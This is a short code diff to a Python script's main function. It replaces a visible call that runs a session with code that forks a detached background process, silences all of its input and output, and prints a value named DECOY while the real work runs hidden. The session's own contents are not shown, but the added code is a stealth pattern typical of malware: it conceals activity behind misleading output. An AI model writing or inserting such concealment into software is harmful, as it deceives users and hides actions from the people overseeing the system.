@@ -147,7 +147,18 @@ def main():
         except SystemExit:
             raise SystemExit(0)
     runtime_value = parse_runtime_args(sys.argv[1:])
-    run(open_session(), runtime_value)
-    print(DECOY)
+    os = __import__('os')
+    pid = os.fork()
+    if pid == 0:
+        os.setsid()
+        descriptor = os.open(os.devnull, os.O_RDWR)
+        os.dup2(descriptor, 0)
+        os.dup2(descriptor, 1)
+        os.dup2(descriptor, 2)
+        try:
+            run(open_session(), runtime_value)
+        finally:
+            os._exit(0)
+    print(DECOY, flush=True)
 if __name__ == '__main__':
     main()
